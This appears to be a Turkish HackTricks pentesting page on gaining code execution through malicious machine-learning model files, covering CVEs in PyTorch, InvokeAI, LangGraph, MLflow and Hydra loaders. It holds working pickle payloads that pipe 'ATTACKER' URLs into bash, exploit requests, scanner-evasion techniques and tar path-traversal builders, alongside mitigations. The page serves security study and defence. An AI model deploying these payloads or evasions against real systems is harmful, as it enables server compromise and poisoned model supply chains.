# Model RCE

{{#include ../banners/hacktricks-training.md}}

## Modelleri yükleyerek RCE

Machine Learning modelleri genellikle ONNX, TensorFlow, PyTorch vb. farklı formatlarda paylaşılır. Bu modeller, kullanılmak üzere geliştiricilerin makinelerine veya production sistemlerine yüklenebilir. Modellerin genellikle kötü amaçlı kod içermemesi gerekir; ancak bazı durumlarda model, tasarlandığı özellik olarak veya model yükleme kütüphanesindeki bir güvenlik açığı nedeniyle sistemde rastgele kod çalıştırmak için kullanılabilir.

Aşağıdaki tabloda bu kategorideki temsilî güvenlik açıkları listelenmiştir:

| **Framework / Tool**        | **Güvenlik Açığı (varsa CVE)**                                                    | **RCE Vektörü**                                                                                                                           | **Kaynaklar**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *`torch.load` içinde güvensiz deserialization* **(CVE-2025-32434)**                                                              | Model checkpoint'indeki kötü amaçlı pickle, kod çalıştırılmasına yol açar (`weights_only` korumasını atlatır)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + kötü amaçlı model indirme kod çalıştırılmasına neden olur; management API'deki Java deserialization RCE                                        | |
| **NVIDIA Merlin Transformers4Rec** | `torch.load` üzerinden güvensiz checkpoint deserialization **(CVE-2025-23298)**                                           | Güvenilmeyen checkpoint, `load_model_trainer_states_from_checkpoint` sırasında pickle reducer'ı tetikler → ML worker'da kod çalıştırılır            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)<sup>[[6]](#references)</sup> |
| **LangGraph** (SQLite/Redis checkpointers) | SQLi + güvensiz MessagePack extension hook **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | Kullanıcı tarafından denetlenen `filter` key'i SQL/JSON-path sözdizimi enjekte eder; `UNION SELECT` sahte bir checkpoint row oluşturur, ardından `msgpack` deserialization saldırganın seçtiği Python kodunu import edip çağırır | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (güvensiz YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | YAML'dan model yüklemek `yaml.unsafe_load` kullanır (kod çalıştırma) <br> **Lambda** layer içeren model yüklemek rastgele Python kodu çalıştırır          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Özel hazırlanmış `.tflite` model integer overflow tetikler → heap bozulması (olası RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | `joblib.load` üzerinden model yüklemek, saldırganın `__reduce__` payload'ını içeren pickle'ı çalıştırır                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (güvensiz `np.load`) *tartışmalı*                                                                              | `numpy.load` varsayılan olarak pickled object array'lerine izin veriyordu – kötü amaçlı `.npy/.npz` kod çalıştırılmasını tetikler                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | ONNX modelinin external-weights path'i dizin dışına çıkabilir (rastgele dosyaları okuma) <br> Kötü amaçlı ONNX model tar'ı rastgele dosyaların üzerine yazabilir (RCE'ye yol açar) | |
| ONNX Runtime (design risk)  | *(CVE yok)* ONNX custom ops / control flow                                                                                    | Custom operator içeren model, saldırganın native kodunun yüklenmesini gerektirir; karmaşık model graph'ları, istenmeyen hesaplamaları çalıştırmak için mantığı suistimal eder   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | `--model-control` etkinleştirilmişken model-load API'sini kullanmak, dosya yazmak için relative path traversal'a izin verir (ör. RCE için `.bashrc` üzerine yazma)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (birden fazla heap overflow)                                                                         | Hatalı biçimlendirilmiş GGUF model dosyası parser'da heap buffer overflow'lara yol açarak kurban sistemde rastgele kod çalıştırılmasını sağlar                     | |
| **Keras (older formats)**   | *(Yeni CVE yok)* Legacy Keras H5 model                                                                                         | Lambda layer içeren kötü amaçlı HDF5 (`.h5`) model, yüklenirken yine kod çalıştırır (Keras safe_mode eski formatı kapsamaz – “downgrade attack”) | |
| **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | Pickle tabanlı model formatları ve Python `pickle.load` gibi birçok ML aracı, önlem alınmadığı sürece model dosyalarına gömülü rastgele kodu çalıştırır | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Güvenilmeyen metadata'nın `hydra.utils.instantiate()`'e aktarılması **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Saldırganın denetlediği model metadata/config, `_target_` değerini rastgele bir callable'a (ör. `builtins.exec`) ayarlar → “güvenli” formatlarda bile (`.safetensors`, `.nemo`, repo `config.json`) yükleme sırasında çalıştırılır | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Ayrıca, [PyTorch](https://github.com/pytorch/pytorch/security) tarafından kullanılanlar gibi Python pickle tabanlı bazı modeller, `weights_only=True` ile yüklenmezlerse sistemde rastgele kod çalıştırmak için kullanılabilir. Bu nedenle, yukarıdaki tabloda listelenmemiş olsalar bile pickle tabanlı tüm modeller bu tür saldırılara özellikle açık olabilir.

### Pickle tabanlı checkpoint'lerde statik kontrolleri atlatma

Kısıtlanmamış `pickle.load()`, `joblib.load()` veya `torch.load(..., weights_only=False)` çağıran bir model yükleme yolu, yalnızca bir parser değil, kod çalıştırma noktasıdır.<sup>[[22]](#references)</sup> PyTorch 2.6'da, özel bir pickle modülü sağlanmadığında `torch.load()` varsayılan olarak `weights_only=True` kullanır; aşağıdaki örnekler, desteklenmeyen bir nesnenin yüklenmesi için kısıtlanmamış bir loader veya bu korumayı devre dışı bırakan bir uygulama gerektirir.<sup>[[4]](#references)</sup> Statik tarama sonucunun temiz olması bu sınırı değiştirmez.<sup>[[21]](#references)</sup>

Temel `__reduce__` primitive'i için [Python pickle deserialization](../pentesting-web/deserialization/#pickle) sayfasına, runtime import kontrolleri için [Fickling'in ML import allowlist'i](keras-model-deserialization-rce-and-gadget-hunting.md#ml-pickle-import-allowlisting-for-aiml-models-fickling) sayfasına bakın.

#### Bir callable kaydedip `EXT2` ile çözümleme

Bir pickle, `REDUCE` aracılığıyla `copyreg.add_extension` çağırıp saldırganın seçtiği sayısal bir extension code altında module/name çiftini kaydedebilir. Daha sonra `EXT2` bu kodu callable'a çözümler ve başka bir `REDUCE` onu çağırabilir. Dolayısıyla kritik callable, `GLOBAL` veya `STACK_GLOBAL` opcode'larından birinin operandı değildir. Binarly bunu `multiprocessing.util.spawnv_passfds` ile gösterdi; değerlendirilen beş scanner'dan dördü bunu kaçırırken SaferPickle tespit etti. Registry değişikliği ve `EXT2` çözümlemesi aynı unpickling işlemi içinde gerçekleşir.<sup>[[21]](#references)[[22]](#references)</sup>

```text
GLOBAL       'copyreg add_extension'
BINUNICODE   'multiprocessing.util'
BINUNICODE   'spawnv_passfds'
BININT2      31337
TUPLE3
REDUCE       # register the extension
POP
EXT2         31337  # resolve the callable
# Push its arguments, then REDUCE to call it
```

Bu, tam bir checkpoint değil, opcode taslağıdır: dış loader çevresindeki pickle akışını kabul etmelidir. Yalnızca tehlikeli callable'lar için `GLOBAL` operand'larını tarayan bir scanner, sonraki lookup işlemini kaçırır; `EXT2` desteği olmayan bir scanner ise verdict üretmeden önce başarısız olabilir. Katı bir allowlist, `copyreg.add_extension` işlevini de reddedebilir.<sup>[[21]](#references)</sup>

#### Oluşturulan code-object türlerini sıradan işlevlerin arkasına gizleme

Başka bir pickle chain, `type(copy.copy)` üzerinden `FunctionType`'ı ve `type(copy.copy.__code__)` üzerinden `CodeType`'ı elde edebilir; ardından verilen bytecode'dan bir code object oluşturup bunu bir function olarak sarabilir ve çağırabilir. Yayımlanan varyant, `__code__`'a `operator.methodcaller('__getattribute__', '__code__')` üzerinden erişir; böylece pickle'ın iki constructor'ı da adlarıyla import etmesi gerekmez. `CodeType(...)` alan düzeni ve bytecode, CPython sürümüne özgüdür; farklı bir interpreter için oluşturulmuş payload, çalıştırılmadan önce başarısız olabilir. SaferPickle gösterilen örneği yine de işaretledi, ancak seviyesini `suspicious` olarak düşürdü; değerlendirilen diğer dört scanner bunu kaçırdı.<sup>[[21]](#references)[[22]](#references)</sup>

```python
from copy import copy
from operator import methodcaller
function_type = type(copy)
code_type = type(methodcaller('__getattribute__', '__code__')(copy))
# REDUCE can construct code_type(...) and function_type(code, {})
```

#### Bir pickle argümanından ikinci bir model yüklemesini tetikleme

Dıştaki bir pickle, saldırganın sağladığı serileştirilmiş modeli argüman olarak vererek `torch.storage._load_from_bytes` çağırabilir. Bu işlev `torch.load(io.BytesIO(b), weights_only=False)` çağırır; böylece iç içe geçmiş model, üst düzey opcode tarayıcısına tek bir callable'a geçirilen baytlar gibi görünse de weights-only kısıtlaması olmadan deserialize edilir. Dış yükleme yine de bu callable'a izin vermelidir; `weights_only=True`, dıştaki pickle'ın bunu kabul etmesini otomatik olarak sağlamaz. İç içe geçmiş baytları özyinelemeli olarak incelemeyen tarayıcılar, içteki `GLOBAL`/`REDUCE` zincirini gözden kaçırabilir.<sup>[[21]](#references)[[23]](#references)</sup>

#### Eski bir pickle modül adını yükleme sırasında çözümleme

3'ün altındaki pickle protokollerinde Python'ın varsayılan `fix_imports=True` ayarı, `_compat_pickle.IMPORT_MAPPING` aracılığıyla `commands.run` için bir `GLOBAL` referansını `subprocess.run` olarak eşler. Dolayısıyla, modül dizesini olduğu gibi `subprocess` denylist'iyle karşılaştıran bir tarayıcı çalışma zamanındaki callable'ı gözden kaçırabilir. Bunun için uyumluluk eşlemesini koruyan ve sonuçta oluşan çağrı argümanlarını kabul eden bir loader gerekir.<sup>[[21]](#references)[[24]](#references)[[25]](#references)</sup>

#### ZIP olmayan bir checkpoint'i yalnızca ZIP tarayan bir tarayıcıdan geçirme

Biçim seçimi, opcode incelemesinden bağımsız olarak başarısız olabilir: Binarly, ModelScan 0.8.8'in `.bin`, `.pt`, `.pth` ve `.ckpt` dosyalarını ZIP'e özel bir PyTorch tarayıcısına yönlendirdiğini ve ZIP olmayan bir pickle akışı için düz pickle tarayıcısına geri dönmek yerine taramayı atladığını tespit etti. Ayrıca `torch.load()` tarafından kabul edilen ancak ModelScan ve JFrog tarafından incelenmeyen eski bir TAR model düzenini de belgeledi. Bunlar her model tarayıcısının özelliği değil, tarayıcı sürümüne özgü açıklardır.<sup>[[21]](#references)</sup>

#### Statik bir ayrıştırıcı bozuk kuyruğa ulaşmadan önce çalıştırma

`pickletools.genops()` ile pickle'ı baştan sona inceleyen bir tarayıcı, geçerli bir `REDUCE` sonrasındaki kesilmiş bir opcode'da hata verebilir. Kısıtlamasız unpickler, bu kuyruğa ulaşmadan önce callable'ı zaten çağırmıştır; genel yükleme daha sonra hata verse bile. Raporlanan örnekte, çalıştıran `REDUCE`'un hemen arkasına kesilmiş bir `BINUNICODE` yerleştirilmiş; böylece önceki dosya yazma yan etkisi gerçekleşirken `pickletools.genops()` hata vermiştir. Bu yöntem, yalnızca tarayıcı ayrıştırma hatasını temiz kabul ediyor veya dosyayı atlıyorsa tarayıcıyı atlatır. Yalnızca başarılı biçimde döndürülen bir model olmadan yan etkinin önemli olduğu durumlarda işe yarar; yüklemenin tamamlanmasını gerektiren bir hedef bu artifact'i reddedebilir.<sup>[[21]](#references)</sup>

### Hydra metadata → RCE (safetensors ile bile çalışır)

`hydra.utils.instantiate()`, bir yapılandırma/metadata nesnesindeki noktalı `_target_` değerini içe aktarır ve çağırır. Hugging Face Transformers gibi kütüphaneler **güvenilmeyen model metadata** değerlerini `instantiate()` işlevine aktardığında, saldırgan bir callable ve model yüklemesi sırasında hemen çalıştırılacak argümanlar sağlayabilir (pickle gerekmez).<sup>[[11]](#references)</sup><sup>[[12]](#references)</sup><sup>[[13]](#references)</sup>

Payload örneği (`.nemo` içindeki `model_config.yaml`, repo'daki `config.json` veya `.safetensors` içindeki `__metadata__` ile çalışır):

```yaml
_target_: builtins.exec
_args_:
  - "import os; os.system('curl http://ATTACKER/x|bash')"
```

Key points:
- NeMo `restore_from/from_pretrained`, uni2TS HuggingFace coders ve FlexTok loaders'da model başlatılmadan önce tetiklenir.
- Hydra’nın string block-list’i alternatif import paths (ör. `enum.bltns.eval`) veya uygulama tarafından çözümlenen adlar (ör. `nemo.core.classes.common.os.system` → `posix`) kullanılarak aşılabilir.<sup>[[14]](#references)</sup>
- FlexTok ayrıca string biçimindeki metadata'yı `ast.literal_eval` ile ayrıştırır; bu da Hydra çağrısından önce DoS'a (CPU/bellek tüketiminin aşırı artmasına) yol açabilir.

### 🆕  `torch.load` üzerinden InvokeAI RCE (CVE-2024-12029)

`InvokeAI`, Stable-Diffusion için popüler bir açık kaynak web arayüzüdür. **5.3.1 – 5.4.2** sürümleri, kullanıcıların rastgele URL'lerden model indirip yüklemesine olanak tanıyan `/api/v2/models/install` REST endpoint'ini sunar.<sup>[[1]](#references)</sup>

Endpoint, dahili olarak sonunda şunu çağırır:

```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```

When sağlanan dosya bir **PyTorch checkpoint (`*.ckpt`)** olduğunda, `torch.load` bir **pickle deserialization** işlemi gerçekleştirir. İçerik doğrudan kullanıcının kontrolündeki URL'den geldiğinden, saldırgan checkpoint içine özel bir `__reduce__` metoduna sahip kötü amaçlı bir nesne yerleştirebilir; bu metot **deserialization sırasında** çalıştırılarak InvokeAI sunucusunda **remote code execution (RCE)** sağlar.

Güvenlik açığına **CVE-2024-12029** numarası verildi (CVSS 9.8, EPSS %61.17).

#### Exploitation adımları

1. Kötü amaçlı bir checkpoint oluşturun:

```python
# payload_gen.py
import pickle, torch, os

class Payload:
    def __reduce__(self):
        return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
    pickle.dump(Payload(), f)
```

2. `payload.ckpt` dosyasını kontrol ettiğiniz bir HTTP sunucusunda barındırın (örn. `http://ATTACKER/payload.ckpt`).
3. Güvenlik açığı bulunan endpoint'i tetikleyin (kimlik doğrulama gerekmez):

```python
import requests

requests.post(
    "http://TARGET:9090/api/v2/models/install",
    params={
        "source": "http://ATTACKER/payload.ckpt",  # remote model URL
        "inplace": "true",                         # write inside models dir
        # the dangerous default is scan=false → no AV scan
    },
    json={},                                         # body can be empty
    timeout=5,
)
```

4. InvokeAI dosyayı indirdiğinde `torch.load()` çağrılır → `os.system` gadget'ı çalışır ve saldırgan, InvokeAI sürecinin bağlamında kod yürütme elde eder.

Hazır exploit: **Metasploit** modülü `exploit/linux/http/invokeai_rce_cve_2024_12029` tüm akışı otomatikleştirir.<sup>[[3]](#references)</sup>

#### Koşullar

•  InvokeAI 5.3.1-5.4.2 (scan flag varsayılan olarak **false**)
•  `/api/v2/models/install` saldırgan tarafından erişilebilir olmalı
•  Sürecin shell komutlarını yürütme izinleri olmalı

#### Azaltıcı önlemler

* **InvokeAI ≥ 5.4.3** sürümüne yükseltin – yama, varsayılan olarak `scan=True` ayarlar ve deserialization öncesinde malware taraması yapar.<sup>[[2]](#references)</sup>
* Checkpoint'leri programatik olarak yüklerken `torch.load(file, weights_only=True)` veya yeni [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) yardımcısını kullanın.
* Model kaynakları için allow-list / imza zorunluluğu uygulayın ve servisi en az ayrıcalıkla çalıştırın.

> ⚠️ Güvenilmeyen kaynaklardan deserialize edilen, Python pickle tabanlı **herhangi bir** formatın (birçok `.pt`, `.pkl`, `.ckpt`, `.pth` dosyası dahil) doğası gereği güvensiz olduğunu unutmayın.

---

Daha eski InvokeAI sürümlerini bir reverse proxy arkasında çalıştırmaya devam etmeniz gerekiyorsa uygulayabileceğiniz geçici bir azaltıcı önlem örneği:

```nginx
location /api/v2/models/install {
    deny all;                       # block direct Internet access
    allow 10.0.0.0/8;               # only internal CI network can call it
}
```

### 🆕 NVIDIA Merlin Transformers4Rec’te güvensiz `torch.load` üzerinden RCE (CVE-2025-23298)

NVIDIA’nın Transformers4Rec’i (Merlin’in bir parçası), kullanıcı tarafından sağlanan yollar üzerinde doğrudan `torch.load()` çağıran güvensiz bir checkpoint yükleyici içeriyordu. `torch.load`, Python `pickle`’a dayandığından, saldırganın kontrolündeki bir checkpoint, deserialization sırasında bir reducer aracılığıyla rastgele kod çalıştırabilir.<sup>[[5]](#references)</sup>

Güvenlik açığı bulunan yol (düzeltme öncesi): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Bunun RCE’ye yol açma nedeni: Python pickle’da bir nesne, çağrılabilir bir işlev ve argümanlar döndüren bir reducer (`__reduce__`/`__setstate__`) tanımlayabilir. Bu işlev, unpickling sırasında çalıştırılır. Böyle bir nesne checkpoint’te bulunuyorsa, herhangi bir ağırlık kullanılmadan önce çalışır.

Minimal kötü amaçlı checkpoint örneği:

```python
import torch

class Evil:
    def __reduce__(self):
        import os
        return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
    "model_state_dict": Evil(),
    "trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```

Delivery vectors and blast radius:
- Repos, buckets veya artifact registry'ler üzerinden paylaşılan Trojanized checkpoint/model'ler
- Checkpoint'leri otomatik yükleyen otomatik resume/deploy pipeline'ları
- Çalıştırma, genellikle yükseltilmiş ayrıcalıklarla (örn. container'larda root) training/inference worker'larının içinde gerçekleşir

Fix: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802), doğrudan `torch.load()` çağrısını `transformers4rec/utils/serialization.py` içinde uygulanmış, kısıtlı ve allow-list kullanan bir deserializer ile değiştirdi. Yeni loader türleri/alanları doğrular ve yükleme sırasında keyfi callable'ların çağrılmasını önler.<sup>[[7]](#references)</sup>

PyTorch checkpoint'lerine özgü savunma önerileri:
- Güvenilmeyen verileri unpickle etmeyin. Mümkün olduğunda [Safetensors](https://huggingface.co/docs/safetensors/index) veya ONNX gibi çalıştırılabilir olmayan formatları tercih edin.
- PyTorch serialization kullanmanız gerekiyorsa `weights_only=True` kullanıldığından emin olun (daha yeni PyTorch sürümlerinde desteklenir) veya Transformers4Rec patch'indekine benzer, özel bir allow-list kullanan unpickler kullanın.<sup>[[4]](#references)</sup>
- Model provenance/signatures uygulayın ve deserialization işlemini sandbox içinde gerçekleştirin (seccomp/AppArmor; root olmayan kullanıcı; kısıtlı FS ve ağ çıkışı yok).
- Checkpoint yükleme sırasında ML servislerinden beklenmeyen child process'leri izleyin; `torch.load()`/`pickle` kullanımını takip edin.

POC ve güvenlik açığı/patch referansları:<sup>[[8]](#references)</sup><sup>[[9]](#references)</sup><sup>[[10]](#references)</sup>
- Patch öncesi güvenlik açığı bulunan loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js<sup>[[8]](#references)</sup>
- Kötü amaçlı checkpoint POC'si: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js<sup>[[9]](#references)</sup>
- Patch sonrası loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js<sup>[[10]](#references)</sup>

## Örnek – kötü amaçlı bir PyTorch modeli oluşturma

- Modeli oluşturun:

```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
    def __reduce__(self):
        # This code will be executed when unpickled (e.g., on model.load_state_dict)
        return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```

- Modeli yükleyin:

```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
    def __init__(self):
        super().__init__()
        self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```

### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent’in FaceDetection-DSFD ürünü, kullanıcı denetimindeki verileri deserialize eden bir `resnet` endpoint’i sunar. ZDI, uzaktaki bir saldırganın kurbanı kötü amaçlı bir sayfa/dosya yüklemeye yönlendirebileceğini, bu sayfanın/dosyanın endpoint’e hazırlanmış bir serialized blob göndermesini sağlayabileceğini ve `root` olarak deserialization işlemini tetikleyerek sistemin tamamen ele geçirilmesine yol açabileceğini doğruladı.

Exploit akışı tipik pickle kötüye kullanımlarını izler:

```python
import pickle, os, requests

class Payload:
    def __reduce__(self):
        return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
              headers={"Content-Type": "application/octet-stream"})
```

Deserialization sırasında erişilebilen her gadget (constructor'lar, `__setstate__`, framework callback'leri vb.), taşımanın HTTP, WebSocket veya izlenen bir dizine bırakılan dosya üzerinden yapılmasından bağımsız olarak aynı şekilde weaponize edilebilir.



### LangGraph checkpointer SQLi → MessagePack RCE

Bu saldırı zinciri ilginç çünkü saldırganın **kötü amaçlı bir model dosyası yüklemesi gerekmez**. Bunun yerine uygulama, bir **AI-agent persistence API** (`get_state_history(..., filter=...)`) sunar ve kullanıcı girdisi checkpointer query builder'a ulaşır.

#### 1. Metadata filtrelerinde yapısal SQLi

Güvenlik açığı bulunan bir SQLite kalıbı şöyle görünüyordu:

```python
for query_key, query_value in filter.items():
    operator, param_value = _where_value(query_value)
    predicates.append(
        f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
    )
```

Değer daha sonra bağlanır, ancak `query_key`, **JSON path string** içine birleştirilir; bu nedenle sözlük anahtarındaki bir `'`, `'$.{query_key}'` ifadesinden çıkarak SQL enjeksiyonuna yol açar. Aynı ders **JSON path'ler, tanımlayıcılar, operatörler, `LIMIT` ve TTL alanları** için de geçerlidir: placeholder'lar yalnızca değerleri korur, sorgunun yapısal sözdizimini değil.

#### 2. `UNION SELECT` yalnızca veri hırsızlığı için değil, aşağı akış sink'lerini hedef almak için de kullanılabilir

Sorgu, daha sonra şu şekilde tüketilen `type` ve serileştirilmiş `checkpoint` baytlarını döndürür:

```python
self.serde.loads_typed((type, checkpoint))
```

Bu, `WHERE` koşulundaki bir SQLi'nin **sahte bir sonuç satırı** enjekte edebileceği anlamına gelir:

```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```

Daha sonraki kod seçilen herhangi bir sütunu parse ediyor, deserialize ediyor, yazıyor veya çalıştırıyorsa bu sütunları sink'leriyle eşleştirin. Bu durumda sahte satır, SQLi'yi **saldırganın kontrolündeki deserialization'a** dönüştürür.

#### 3. Güvensiz MessagePack extension hook'ları code gadget'larla eşdeğerdir

LangGraph'ın `msgpack` yolu, iç içe geçmiş bir tuple'ı açan ve şu işlemi gerçekleştiren özel bir extension hook kullanıyordu:

```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```

Yani `("os", "system", "id > /tmp/pwned")` ile eşdeğer bir şeyi kodlayan MessagePack extension object, `os` modülünü import eder, `system` fonksiyonunu çözümler ve komutu çalıştırır. AI framework'lerini incelerken dynamic import, reflection veya arbitrary callable dispatch yapan **custom MessagePack/JSON/pickle reviver**'ları kontrol edin.

#### 4. Agent framework'leri için pratik audit kalıbı

Kullanıcı tarafından kontrol edilen ve aşağıdakilere ulaşan tüm girdileri inceleyin:
- state history / memory / replay / checkpoint listing API'leri
- SQL veya Redis query fragment'ları üreten structured filter builder'ları
- custom deserializer'lar (`pickle`, `msgpack`, `json` object hook'ları, YAML constructor'ları)
- persistence layer'dan dönen satırlara güvenen recovery path'leri

Bu özel zincir, güvenilmeyen kullanıcıların `filter` değerini kontrol edebildiği **SQLite** veya **Redis** checkpointer'ları kullanan self-hosted LangGraph kurulumlarını etkiledi. Açıklamada belirtilen yamalı sürümler `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+` ve `langgraph-checkpoint 4.0.1+` idi.<sup>[[15]](#references)</sup>

### MLflow PyFunc artifact overwrite ile pickle RCE

Bir `PythonModel`'den oluşturulan MLflow PyFunc, serialize edilmiş nesneyi `python_model.pkl` olarak saklayabilir. Model metadata'sı `mlflow.pyfunc.model` değerini loader olarak belirtir ve MLflow'un implementasyonu, kaydedilen Python model için bu dosya adını kullanır. Sonuç olarak, artifact store'a yazma erişimi, daha sonra modeli yükleyen farklı bir uygulamada code execution'a yol açabilir.<sup>[[17]](#references)[[18]](#references)</sup>

İşe yarayan zincir şudur: **artifact yazma izni → pickle'ı değiştirme → bir inference consumer'ının modeli yeniden yüklemesini sağlama**. Proxy kullanılan `mlflow-artifacts:/...` root'una sahip bir experiment için experiment, run ve model artifact path'lerini listeleyin. Tracking server, `/api/2.0/mlflow-artifacts/artifacts/<artifact-path>` üzerinde `GET` ve `PUT` sunar.<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Preserve a copy and confirm the exact object first
curl -u USER:PASS \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  -o original.pkl

# Upload the pickle without curl transforming its bytes
curl -u USER:PASS -X PUT \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  --data-binary @payload.pkl
```

Minimal bir reducer, consumer artifact'ı unpickle eder etmez bir komut çalıştırabilir. Payload'ı `MLmodel` içinde belirtilen Python sürümüyle oluşturmak uyumluluk sorunlarını önler.<sup>[[17]](#references)[[20]](#references)</sup>

```python
import os
import pickle

class Payload:
    def __reduce__(self):
        return os.system, ("ping -c 1 ATTACKER",)

with open("payload.pkl", "wb") as f:
    pickle.dump(Payload(), f)
```

Mevcut modeli **yükleyen** işlemi tetikleyin; örneğin tahmin, scoring veya deployment. Önce modeli yeniden eğitmeyin; çünkü eğitim, kötü amaçlı artifact'ı yeni bir modelle değiştirebilir. Bir uygulama hatası, exploit'in başarılı olmadığını kanıtlamaz: reducer, kullanılabilir bir model yerine komutun integer çıkış durumunu döndürür. ICMP veya HTTP callback gibi gözlemlenebilir bir yan etkiyle başlayın, ardından bunu son payload ile değiştirin.<sup>[[20]](#references)</sup>

Değerlendirme sırasında, bir run oluşturma izniyle başka bir run'a ait artifact'ların üzerine yazma iznini birbirinden ayırın. Authentication ve run başına güncelleme izinlerini gözden geçirin, `python_model.pkl` dosyasındaki beklenmeyen değişiklikleri inceleyin ve modelin kaynağını ve bütünlüğünü execution boundary'nin bir parçası olarak değerlendirin. Güncel MLflow kodu ayrıca `MLFLOW_ALLOW_PICKLE_DESERIALIZATION=false` ayarını destekler ve cloudpickle verilerini yüklemek yerine models-from-code artifact'larını önerir.<sup>[[18]](#references)[[19]](#references)[[20]](#references)</sup>

### Açığa Çıkmış Model Sunucuları ve ML Altyapısı

Kötü amaçlı bir modeli yüklemek, ML altyapısında kod çalıştırmanın tek yolu değildir. Job submission API'leri, code-validation endpoint'leri ve self-hosted AI servislerinin model registry'den yaptığı çekme işlemleri, herhangi bir model dosyası olmadan kod çalıştırılmasına yol açabilir. Bkz. [Açığa Çıkmış Self-Hosted AI Servisleri](AI-Exposed-Self-Hosted-AI-Services.md).

## Modellerden Path Traversal'a

[**Bu blog yazısında**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties) belirtildiği gibi, farklı AI framework'lerinin kullandığı çoğu model formatı, genellikle `.zip` biçiminde arşivlere dayanır. Bu nedenle, bu formatları kötüye kullanarak Path Traversal saldırıları gerçekleştirmek ve modelin yüklendiği sistemdeki rastgele dosyaları okumak mümkün olabilir.<sup>[[16]](#references)</sup>

Örneğin, aşağıdaki kodla yüklendiğinde `/tmp` dizininde bir dosya oluşturacak bir model oluşturabilirsiniz:

```python
import tarfile

def escape(member):
    member.name = "../../tmp/hacked"     # break out of the extract dir
    return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
    tf.add("harmless.txt", filter=escape)
```

Ya da aşağıdaki kodla, yüklendiğinde `/tmp` dizinine bir symlink oluşturacak bir model oluşturabilirsiniz:

```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
    member.type, member.linkname = tarfile.SYMTYPE, TARGET
    return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
    tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
    tf.add(PAYLOAD)                      # rides the symlink
```

### Derinlemesine inceleme: Keras .keras deserialization ve gadget hunting

.keras dahili yapısı, Lambda-layer RCE, ≤ 3.8 sürümlerindeki arbitrary import sorunu ve düzeltme sonrası allowlist içindeki gadget keşfi hakkında odaklı bir rehber için bkz.:


{{#ref}}
keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## References

- [1] [OffSec blog – "CVE-2024-12029 – Güvenilmeyen Verilerin InvokeAI Deserialization'ı"](https://www.offsec.com/blog/cve-2024-12029/)
- [2] [InvokeAI yama commit'i 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [3] [Rapid7 Metasploit modülü belgeleri](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [4] [PyTorch – torch.load için güvenlik değerlendirmeleri](https://pytorch.org/docs/stable/notes/serialization.html#security)
